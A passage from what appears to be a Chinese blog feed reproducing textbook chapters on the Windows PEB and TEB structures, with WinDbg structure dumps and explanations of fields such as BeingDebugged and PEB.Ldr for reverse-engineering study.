class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c">+<span class="hljs-number">0x000</span> InheritedAddressSpace : UChar<br> +<span class="hljs-number">0x001</span> ReadImageFileExecOptions : UChar<br> +<span class="hljs-number">0x002</span> BeingDebugged    : UChar  调试标志<br> +<span class="hljs-number">0x003</span> SpareBool        : UChar<br> +<span class="hljs-number">0x004</span> Mutant           : Ptr32 Void<br> +<span class="hljs-number">0x008</span> ImageBaseAddress : Ptr32 Void 映像基址<br> +<span class="hljs-number">0x00c</span> Ldr              : Ptr32 _PEB_LDR_DATA 进程加载模块链表<br> +<span class="hljs-number">0x010</span> ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS<br> +<span class="hljs-number">0x014</span> SubSystemData    : Ptr32 Void<br> +<span class="hljs-number">0x018</span> ProcessHeap      : Ptr32 Void<br> +<span class="hljs-number">0x01c</span> FastPebLock      : Ptr32 _RTL_CRITICAL_SECTION<br> +<span class="hljs-number">0x020</span> FastPebLockRoutine : Ptr32 Void<br> +<span class="hljs-number">0x024</span> FastPebUnlockRoutine : Ptr32 Void<br> +<span class="hljs-number">0x028</span> EnvironmentUpdateCount : Uint4B<br> +<span class="hljs-number">0x02c</span> KernelCallbackTable : Ptr32 Void<br> +<span class="hljs-number">0x030</span> SystemReserved   : [<span class="hljs-number">1</span>] Uint4B<br> +<span class="hljs-number">0x034</span> AtlThunkSListPtr32 : Uint4B<br> +<span class="hljs-number">0x038</span> FreeList         : Ptr32 _PEB_FREE_BLOCK<br> +<span class="hljs-number">0x03c</span> TlsExpansionCounter : Uint4B<br> +<span class="hljs-number">0x040</span> TlsBitmap        : Ptr32 Void<br> +<span class="hljs-number">0x044</span> TlsBitmapBits    : [<span class="hljs-number">2</span>] Uint4B<br> +<span class="hljs-number">0x04c</span> ReadOnlySharedMemoryBase : Ptr32 Void<br> +<span class="hljs-number">0x050</span> ReadOnlySharedMemoryHeap : Ptr32 Void<br> +<span class="hljs-number">0x054</span> ReadOnlyStaticServerData : Ptr32 Ptr32 Void<br> +<span class="hljs-number">0x058</span> AnsiCodePageData : Ptr32 Void<br> +<span class="hljs-number">0x05c</span> OemCodePageData  : Ptr32 Void<br> +<span class="hljs-number">0x060</span> UnicodeCaseTableData : Ptr32 Void<br> +<span class="hljs-number">0x064</span> NumberOfProcessors : Uint4B<br> +<span class="hljs-number">0x068</span> NtGlobalFlag     : Uint4B<br> +<span class="hljs-number">0x070</span> CriticalSectionTimeout : _LARGE_INTEGER<br> +<span class="hljs-number">0x078</span> HeapSegmentReserve : Uint4B<br> +<span class="hljs-number">0x07c</span> HeapSegmentCommit : Uint4B<br> +<span class="hljs-number">0x080</span> HeapDeCommitTotalFreeThreshold : Uint4B<br> +<span class="hljs-number">0x084</span> HeapDeCommitFreeBlockThreshold : Uint4B<br> +<span class="hljs-number">0x088</span> NumberOfHeaps    : Uint4B<br> +<span class="hljs-number">0x08c</span> MaximumNumberOfHeaps : Uint4B<br> +<span class="hljs-number">0x090</span> ProcessHeaps     : Ptr32 Ptr32 Void<br> +<span class="hljs-number">0x094</span> GdiSharedHandleTable : Ptr32 Void<br> +<span class="hljs-number">0x098</span> ProcessStarterHelper : Ptr32 Void<br> +<span class="hljs-number">0x09c</span> GdiDCAttributeList : Uint4B<br> +<span class="hljs-number">0x0a0</span> LoaderLock       : Ptr32 Void<br> +<span class="hljs-number">0x0a4</span> OSMajorVersion   : Uint4B<br> +<span class="hljs-number">0x0a8</span> OSMinorVersion   : Uint4B<br> +<span class="hljs-number">0x0ac</span> OSBuildNumber    : Uint2B<br> +<span class="hljs-number">0x0ae</span> OSCSDVersion     : Uint2B<br> +<span class="hljs-number">0x0b0</span> OSPlatformId     : Uint4B<br> +<span class="hljs-number">0x0b4</span> ImageSubsystem   : Uint4B<br> +<span class="hljs-number">0x0b8</span> ImageSubsystemMajorVersion : Uint4B<br> +<span class="hljs-number">0x0bc</span> ImageSubsystemMinorVersion : Uint4B<br> +<span class="hljs-number">0x0c0</span> ImageProcessAffinityMask : Uint4B<br> +<span class="hljs-number">0x0c4</span> GdiHandleBuffer  : [<span class="hljs-number">34</span>] Uint4B<br> +<span class="hljs-number">0x14c</span> PostProcessInitRoutine : Ptr32     <span class="hljs-type">void</span> <br> +<span class="hljs-number">0x150</span> TlsExpansionBitmap : Ptr32 Void<br> +<span class="hljs-number">0x154</span> TlsExpansionBitmapBits : [<span class="hljs-number">32</span>] Uint4B<br> +<span class="hljs-number">0x1d4</span> SessionId        : Uint4B<br> +<span class="hljs-number">0x1d8</span> AppCompatFlags   : _ULARGE_INTEGER<br> +<span class="hljs-number">0x1e0</span> AppCompatFlagsUser : _ULARGE_INTEGER<br> +<span class="hljs-number">0x1e8</span> pShimData        : Ptr32 Void<br> +<span class="hljs-number">0x1ec</span> AppCompatInfo    : Ptr32 Void<br> +<span class="hljs-number">0x1f0</span> CSDVersion       : _UNICODE_STRING<br> +<span class="hljs-number">0x1f8</span> ActivationContextData : Ptr32 Void<br> +<span class="hljs-number">0x1fc</span> ProcessAssemblyStorageMap : Ptr32 Void<br> +<span class="hljs-number">0x200</span> SystemDefaultActivationContextData : Ptr32 Void<br> +<span class="hljs-number">0x204</span> SystemAssemblyStorageMap : Ptr32 Void<br> +<span class="hljs-number">0x208</span> MinimumStackCommit : Uint4B<br></code></pre></td></tr></table></figure><p>Windows 7下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs c">dt ntdll!_PEB<br>   +<span class="hljs-number">0x000</span> InheritedAddressSpace : UChar<br>   +<span class="hljs-number">0x001</span> ReadImageFileExecOptions : UChar<br>   +<span class="hljs-number">0x002</span> BeingDebugged    : UChar<br>   +<span class="hljs-number">0x003</span> BitField         : UChar<br>   +<span class="hljs-number">0x003</span> ImageUsesLargePages : Pos <span class="hljs-number">0</span>, <span class="hljs-number">1</span> Bit<br>   +<span class="hljs-number">0x003</span> IsProtectedProcess : Pos <span class="hljs-number">1</span>, <span class="hljs-number">1</span> Bit<br>   +<span class="hljs-number">0x003</span> IsLegacyProcess  : Pos <span class="hljs-number">2</span>, <span class="hljs-number">1</span> Bit<br>   +<span class="hljs-number">0x003</span> IsImageDynamicallyRelocated : Pos <span class="hljs-number">3</span>, <span class="hljs-number">1</span> Bit<br>   +<span class="hljs-number">0x003</span> SkipPatchingUser32Forwarders : Pos <span class="hljs-number">4</span>, <span class="hljs-number">1</span> Bit<br>   +<span class="hljs-number">0x003</span> SpareBits        : Pos <span class="hljs-number">5</span>, <span class="hljs-number">3</span> Bits<br>   +<span class="hljs-number">0x004</span> Mutant           : Ptr32 Void<br>   +<span class="hljs-number">0x008</span> ImageBaseAddress : Ptr32 Void<br>   +<span class="hljs-number">0x00c</span> Ldr              : Ptr32 _PEB_LDR_DATA<br>   +<span class="hljs-number">0x010</span> ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS<br>   +<span class="hljs-number">0x014</span> SubSystemData    : Ptr32 Void<br>   +<span class="hljs-number">0x018</span> ProcessHeap      : Ptr32 Void<br>   +<span class="hljs-number">0x01c</span> FastPebLock      : Ptr32 _RTL_CRITICAL_SECTION<br>   +<span class="hljs-number">0x020</span> AtlThunkSListPtr : Ptr32 Void<br>   +<span class="hljs-number">0x024</span> IFEOKey          : Ptr32 Void<br>   +<span class="hljs-number">0x028</span> CrossProcessFlags : Uint4B<br>   +<span class="hljs-number">0x028</span> ProcessInJob     : Pos <span class="hljs-number">0</span>, <span class="hljs-number">1</span> Bit<br>   +<span class="hljs-number">0x028</span> ProcessInitializing : Pos <span class="hljs-number">1</span>, <span class="hljs-number">1</span> Bit<br>   +<span class="hljs-number">0x028</span> ProcessUsingVEH  : Pos <span class="hljs-number">2</span>, <span class="hljs-number">1</span> Bit<br>   +<span class="hljs-number">0x028</span> ProcessUsingVCH  : Pos <span class="hljs-number">3</span>, <span class="hljs-number">1</span> Bit<br>   +<span class="hljs-number">0x028</span> ProcessUsingFTH  : Pos <span class="hljs-number">4</span>, <span class="hljs-number">1</span> Bit<br>   +<span class="hljs-number">0x028</span> ReservedBits0    : Pos <span class="hljs-number">5</span>, <span class="hljs-number">27</span> Bits<br>   +<span class="hljs-number">0x02c</span> KernelCallbackTable : Ptr32 Void<br>   +<span class="hljs-number">0x02c</span> UserSharedInfoPtr : Ptr32 Void<br>   +<span class="hljs-number">0x030</span> SystemReserved   : [<span class="hljs-number">1</span>] Uint4B<br>   +<span class="hljs-number">0x034</span> AtlThunkSListPtr32 : Uint4B<br>   +<span class="hljs-number">0x038</span> ApiSetMap        : Ptr32 Void<br>   +<span class="hljs-number">0x03c</span> TlsExpansionCounter : Uint4B<br>   +<span class="hljs-number">0x040</span> TlsBitmap        : Ptr32 Void<br>   +<span class="hljs-number">0x044</span> TlsBitmapBits    : [<span class="hljs-number">2</span>] Uint4B<br>   +<span class="hljs-number">0x04c</span> ReadOnlySharedMemoryBase : Ptr32 Void<br>   +<span class="hljs-number">0x050</span> HotpatchInformation : Ptr32 Void<br>   +<span class="hljs-number">0x054</span> ReadOnlyStaticServerData : Ptr32 Ptr32 Void<br>   +<span class="hljs-number">0x058</span> AnsiCodePageData : Ptr32 Void<br>   +<span class="hljs-number">0x05c</span> OemCodePageData  : Ptr32 Void<br>   +<span class="hljs-number">0x060</span> UnicodeCaseTableData : Ptr32 Void<br>   +<span class="hljs-number">0x064</span> NumberOfProcessors : Uint4B<br>   +<span class="hljs-number">0x068</span> NtGlobalFlag     : Uint4B<br>   +<span class="hljs-number">0x070</span> CriticalSectionTimeout : _LARGE_INTEGER<br>   +<span class="hljs-number">0x078</span> HeapSegmentReserve : Uint4B<br>   +<span class="hljs-number">0x07c</span> HeapSegmentCommit : Uint4B<br>   +<span class="hljs-number">0x080</span> HeapDeCommitTotalFreeThreshold : Uint4B<br>   +<span class="hljs-number">0x084</span> HeapDeCommitFreeBlockThreshold : Uint4B<br>   +<span class="hljs-number">0x088</span> NumberOfHeaps    : Uint4B<br>   +<span class="hljs-number">0x08c</span> MaximumNumberOfHeaps : Uint4B<br>   +<span class="hljs-number">0x090</span> ProcessHeaps     : Ptr32 Ptr32 Void<br>   +<span class="hljs-number">0x094</span> GdiSharedHandleTable : Ptr32 Void<br>   +<span class="hljs-number">0x098</span> ProcessStarterHelper : Ptr32 Void<br>   +<span class="hljs-number">0x09c</span> GdiDCAttributeList : Uint4B<br>   +<span class="hljs-number">0x0a0</span> LoaderLock       : Ptr32 _RTL_CRITICAL_SECTION<br>   +<span class="hljs-number">0x0a4</span> OSMajorVersion   : Uint4B<br>   +<span class="hljs-number">0x0a8</span> OSMinorVersion   : Uint4B<br>   +<span class="hljs-number">0x0ac</span> OSBuildNumber    : Uint2B<br>   +<span class="hljs-number">0x0ae</span> OSCSDVersion     : Uint2B<br>   +<span class="hljs-number">0x0b0</span> OSPlatformId     : Uint4B<br>   +<span class="hljs-number">0x0b4</span> ImageSubsystem   : Uint4B<br>   +<span class="hljs-number">0x0b8</span> ImageSubsystemMajorVersion : Uint4B<br>   +<span class="hljs-number">0x0bc</span> ImageSubsystemMinorVersion : Uint4B<br>   +<span class="hljs-number">0x0c0</span> ActiveProcessAffinityMask : Uint4B<br>   +<span class="hljs-number">0x0c4</span> GdiHandleBuffer  : [<span class="hljs-number">34</span>] Uint4B<br>   +<span class="hljs-number">0x14c</span> PostProcessInitRoutine : Ptr32     <span class="hljs-type">void</span> <br>   +<span class="hljs-number">0x150</span> TlsExpansionBitmap : Ptr32 Void<br>   +<span class="hljs-number">0x154</span> TlsExpansionBitmapBits : [<span class="hljs-number">32</span>] Uint4B<br>   +<span class="hljs-number">0x1d4</span> SessionId        : Uint4B<br>   +<span class="hljs-number">0x1d8</span> AppCompatFlags   : _ULARGE_INTEGER<br>   +<span class="hljs-number">0x1e0</span> AppCompatFlagsUser : _ULARGE_INTEGER<br>   +<span class="hljs-number">0x1e8</span> pShimData        : Ptr32 Void<br>   +<span class="hljs-number">0x1ec</span> AppCompatInfo    : Ptr32 Void<br>   +<span class="hljs-number">0x1f0</span> CSDVersion       : _UNICODE_STRING<br>   +<span class="hljs-number">0x1f8</span> ActivationContextData : Ptr32 _ACTIVATION_CONTEXT_DATA<br>   +<span class="hljs-number">0x1fc</span> ProcessAssemblyStorageMap : Ptr32 _ASSEMBLY_STORAGE_MAP<br>   +<span class="hljs-number">0x200</span> SystemDefaultActivationContextData : Ptr32 _ACTIVATION_CONTEXT_DATA<br>   +<span class="hljs-number">0x204</span> SystemAssemblyStorageMap : Ptr32 _ASSEMBLY_STORAGE_MAP<br>   +<span class="hljs-number">0x208</span> MinimumStackCommit : Uint4B<br>   +<span class="hljs-number">0x20c</span> FlsCallback      : Ptr32 _FLS_CALLBACK_INFO<br>   +<span class="hljs-number">0x210</span> FlsListHead      : _LIST_ENTRY<br>   +<span class="hljs-number">0x218</span> FlsBitmap        : Ptr32 Void<br>   +<span class="hljs-number">0x21c</span> FlsBitmapBits    : [<span class="hljs-number">4</span>] Uint4B<br>   +<span class="hljs-number">0x22c</span> FlsHighIndex     : Uint4B<br>   +<span class="hljs-number">0x230</span> WerRegistrationData : Ptr32 Void<br>   +<span class="hljs-number">0x234</span> WerShipAssertPtr : Ptr32 Void<br>   +<span class="hljs-number">0x238</span> pContextData     : Ptr32 Void<br>   +<span class="hljs-number">0x23c</span> pImageHeaderHash : Ptr32 Void<br>   +<span class="hljs-number">0x240</span> TracingFlags     : Uint4B<br>   +<span class="hljs-number">0x240</span> HeapTracingEnabled : Pos <span class="hljs-number">0</span>, <span class="hljs-number">1</span> Bit<br>   +<span class="hljs-number">0x240</span> CritSecTracingEnabled : Pos <span class="hljs-number">1</span>, <span class="hljs-number">1</span> Bit<br>   +<span class="hljs-number">0x240</span> SpareTracingBits : Pos <span class="hljs-number">2</span>, <span class="hljs-number">30</span> Bits<br></code></pre></td></tr></table></figure><h1 id="47-2-PEB的重要成员"><a href="#47-2-PEB的重要成员" class="headerlink" title="47.2 PEB的重要成员"></a>47.2 PEB的重要成员</h1><p>PEB结构体非常庞大，且结构复杂，我们只简单讲解其中几个与代码逆向分析相关的重要成员。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">+<span class="hljs-number">0x002</span> BeingDebugged    : UChar<br>+<span class="hljs-number">0x008</span> ImageBaseAddress : Ptr32 Void<br>+<span class="hljs-number">0x00c</span> Ldr              : Ptr32 _PEB_LDR_DATA<br>+<span class="hljs-number">0x018</span> ProcessHeap      : Ptr32 Void<br>+<span class="hljs-number">0x068</span> NtGlobalFlag     : Uint4B<br></code></pre></td></tr></table></figure><h2 id="47-2-1-PEB-BeingDebugged"><a href="#47-2-1-PEB-BeingDebugged" class="headerlink" title="47.2.1 PEB.BeingDebugged"></a>47.2.1 PEB.BeingDebugged</h2><p>Kernel32.dll中有个名为Kernel32!IsDebuggerPresent()的API，但普通的应用程序开发中并不常用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL WINAPI <span class="hljs-title function_">IsDebuggerPresent</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br></code></pre></td></tr></table></figure><p>顾名思义，该API函数用于判断当前进程是否处于调试状态，并返回判断结果。该API通过检测PEB.BeingDebugged成员来确定是否正在调试进程（是，则返回1；否，则返回0）。图47~4中</p><p>显示IsDebuggerPresent() API的代码。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC47%E7%AB%A0%20PEB.assets/image-20220321105128344.png#alt=image-20220321105128344"></p><blockquote><p>Windows 7中，IsDebuggerPresent() API 是在 Kernelbase.dll 中实现的。而在 Windows</p></blockquote><p>XP及以前版本的操作系统中，它是在kernel32.dll中实现的。</p><p>在图47-4中先获取FS:[18]的TEB地址，然后通过DS:[TEB+30]处的TEB.ProcessEnvironmentBlock成员访问PEB结构体。这与直接使用FS:[30]访问PEB结构体是一样的（如上所述，原则上要先获取TEB结构体）。我的电脑环境中，PEB结构体的地址为7FFD5000，所以PEB.BeingDebugged成员的地址为7FFDF002，其值为1（TRUE），如图47-5所示，表示当前进程处于调试状态。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC47%E7%AB%A0%20PEB.assets/image-20220321110732837.png#alt=image-20220321110732837"></p><p>该值在代码逆向分析领域主要用于反调试技术。检测该值，若进程处于调试中，则终止进程。如各位所见，这是一种非常简单的基础反调试技术，关于反调试技术的更多内容将在第50章详细讲解。</p><h2 id="47-2-2-PEB-ImageBaseAddress"><a href="#47-2-2-PEB-ImageBaseAddress" class="headerlink" title="47.2.2 PEB.ImageBaseAddress"></a>47.2.2 PEB.ImageBaseAddress</h2><p>PEB.ImageBaseAddress成员用来表示进程的ImageBase，如图47-6所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC47%E7%AB%A0%20PEB.assets/image-20220321123612829.png#alt=image-20220321123612829"></p><p>GetModuleHandle() API用来获取ImageBase。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">HMODULE <span class="hljs-title function_">GetModuleHandle</span><span class="hljs-params">(</span><br><span class="hljs-params">    LPCTSTR lpModuleName<span class="hljs-comment">// address of module name to return handle for</span></span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>向IpModuleName参数赋值为NULL，调用GetModuleHandle()函数将返回进程被加载的</p><p>ImageBase。图47-7显示了GetModuleHandle() API的部分代码。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC47%E7%AB%A0%20PEB.assets/image-20220321122807239.png#alt=image-20220321122807239"></p><p>向IpModuleName参数赋人NULL值后，调用GetModuleHandle()函数时将执行上图中的代码。</p><p>从中可以看到，PEB.ImageBaseAddress成员的值被设置到EAX寄存器（函数的返回值）。</p><h2 id="47-2-3-PEB-Ldr"><a href="#47-2-3-PEB-Ldr" class="headerlink" title="47.2.3 PEB.Ldr"></a>47.2.3 PEB.Ldr</h2><p>PEB.Ldr成员是指向_PEB_LDR_DATA结构体的指针。借助WinDbg调试器查看_PEB_LDR_DATA结构体成员，如代码47-5所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">lkd&gt; dt ntdll!_PEB_LDR_DATA<br>   +<span class="hljs-number">0x000</span> Length           : Uint4B<br>   +<span class="hljs-number">0x004</span> Initialized      : UChar<br>   +<span class="hljs-number">0x008</span> SsHandle         : Ptr32 Void<br>   +<span class="hljs-number">0x00c</span> InLoadOrderModuleList : _LIST_ENTRY<br>   +<span class="hljs-number">0x014</span> InMemoryOrderModuleList : _LIST_ENTRY<br>   +<span class="hljs-number">0x01c</span> InInitializationOrderModuleList : _LIST_ENTRY<br>   +<span class="hljs-number">0x024</span> EntryInProgress  : Ptr32 Void<br>   +<span class="hljs-number">0x028</span> ShutdownInProgress : UChar<br>   +<span class="hljs-number">0x02c</span> ShutdownThreadId : Ptr32 Void<br></code></pre></td></tr></table></figure><p>当模块（DLL）加载到进程后，通过PEB.Ldr成员可以直接获取该模块的加载基地址，所以PEB.Ldr是非常重要的成员。_PEB_LDR_DATA结构体成员中有3个_LIST_ENTRY类型的成员</p><p>（InLoadOrderModuleList、InMemoryOrderModuleList 、InlnitializationOrderModuleList），_LIST_ENTRY结构体的定义如代码47-6所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">LIST_ENTRY</span> </span><br><span class="hljs-class">&#123;</span><br>       <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">LIST_ENTRY</span> *<span class="hljs-title">Flink</span>;</span> <br>       <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">LIST_ENTRY</span> *<span class="hljs-title">Blink</span>;</span> <br>&#125; LIST_ENTRY, *PLIST_ENTRY;<br></code></pre></td></tr></table></figure><p>从上述结构体的定义可以看到，_LIST_ENTRY结构体提供了双向链表机制。那么链表中保存着哪些信息呢？ 是_LDR_DATA_TABLE_ENTRY结构体的信息。该结构体的定义如代码47-7所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">LDR_DATA_TABLE_ENTRY</span> &#123;</span><br>    PVOID Reserved1[<span class="hljs-number">2</span>];<br>    LIST_ENTRY InMemoryOrderLinks;<br>    PVOID Reserved2[<span class="hljs-number">2</span>];<br>    PVOID DllBase;<br>    PVOID EntryPoint;<br>    PVOID Reserved3;<br>    UNICODE_STRING FullDllName;<br>    BYTE Reserved4[<span class="hljs-number">8</span>];<br>    PVOID Reserved5[<span class="hljs-number">3</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        ULONG CheckSum;<br>        PVOID Reserved6;<br>    &#125;;<br>    ULONG TimeDateStamp;<br>&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;<br></code></pre></td></tr></table></figure><p>每个加载到进程中的DLL模块都有与之对应的_LDR_DATA_TABLE_ENTRY结构体，这些结构体相互链接，最终形双向链表（参考代码47-6）。需要注意的是， _PEB_LDR_DATA结构体中存在3种链表。也就是说，存在多个_LDR_DATA_TABLE_ENTRY结构体，并且有3种链接方法可以将它们链接起来。</p><h2 id="47-2-4-PEB-ProcessHeap-amp-PEB-NtGlobalFlag"><a href="#47-2-4-PEB-ProcessHeap-amp-PEB-NtGlobalFlag" class="headerlink" title="47.2.4 PEB.ProcessHeap &amp; PEB.NtGlobalFlag"></a>47.2.4 PEB.ProcessHeap &amp; PEB.NtGlobalFlag</h2><p>PEB.ProcessHeap与PEB.NtGlobalFlag成员（像PEB.BeingDebugged成员一样）应用于反调试技术。若进程处于调试状态，则ProcessHeap与NtGlobalFlag成员就持有特定值。由于它们具有这一个特征，所以常常应用于反调试技术（详解请参考第50章）。</p><h1 id="47-3-小结"><a href="#47-3-小结" class="headerlink" title="47.3 小结"></a>47.3 小结</h1><p>我们学习了有关TEB、PEB的知识，后面的调试中会经常遇到。即使各位现在还不能完全理解也不要着急，通过后面的调试练习不断重复学习，最终都会理解的。</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第46章 TEB</title>
    <link href="/1999/04/06/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC46%E7%AB%A0%20TEB/"/>
    <url>/1999/04/06/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC46%E7%AB%A0%20TEB/</url>
    
    <content type="html"><![CDATA[<p>第46章 TEB</p><p>本章将学习有关TEB ( Thread Environment Block,线程环境块）的知识，它们是我们后面要学习的高级调试技术的基础，请大家认真学习，理解并掌握相关概念。</p><h1 id="46-1-TEB"><a href="#46-1-TEB" class="headerlink" title="46.1 TEB"></a>46.1 TEB</h1><p>TEB指线程环境块，该结构体包含进程中运行线程的各种信息，进程中的每个线程都对应一个TEB结构体。不同OS中TEB结构体的形态略微不同，有关TEB结构体的详细说明都已被文档化，各位可以直接查看并参考。</p><h2 id="46-1-1-TEB结构体的定义"><a href="#46-1-1-TEB结构体的定义" class="headerlink" title="46.1.1 TEB结构体的定义"></a>46.1.1 TEB结构体的定义</h2><p>首先看看MSDN中关于TEB结构体的说明。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">TEB</span> &#123;</span><br>    PVOID Reserved1[<span class="hljs-number">12</span>];<br>    PPEB ProcessEnvironmentBlock;<br>    PVOID Reserved2[<span class="hljs-number">399</span>];<br>    BYTE Reserved3[<span class="hljs-number">1952</span>];<br>    PVOID TlsSlots[<span class="hljs-number">64</span>];<br>    BYTE Reserved4[<span class="hljs-number">8</span>];<br>    PVOID Reserved5[<span class="hljs-number">26</span>];<br>    PVOID ReservedForOle;  <span class="hljs-comment">// Windows 2000 only</span><br>    PVOID Reserved6[<span class="hljs-number">4</span>];<br>    PVOID TlsExpansionSlots;<br>&#125; TEB, *PTEB<br></code></pre></td></tr></table></figure><p>正如大家所见，MSDN对TEB结构体的说明太过简单。要想查看关于TEB结构体的更多细节，必须借助类似于WinDbg的内核调试器（Kernel Debugger )才行。</p><blockquote><p>安装并运行WinDbg的方法请参考“WinDbg” 一章。</p></blockquote><h2 id="46-1-2-TEB结构体成员"><a href="#46-1-2-TEB结构体成员" class="headerlink" title="46.1.2 TEB结构体成员"></a>46.1.2 TEB结构体成员</h2><p>使用WinDbg调试器获取TEB结构体的组成成员，如下所示。</p><blockquote><p>获取下面信息的方法：dt ntdll!_TEB（注意配置加载正确的符号文件）</p></blockquote><blockquote><p>若要详细信息</p></blockquote><blockquote><p>输入命令：dt -r1 ntdll!_TEB</p></blockquote><p><strong>Windows XP SP3中</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 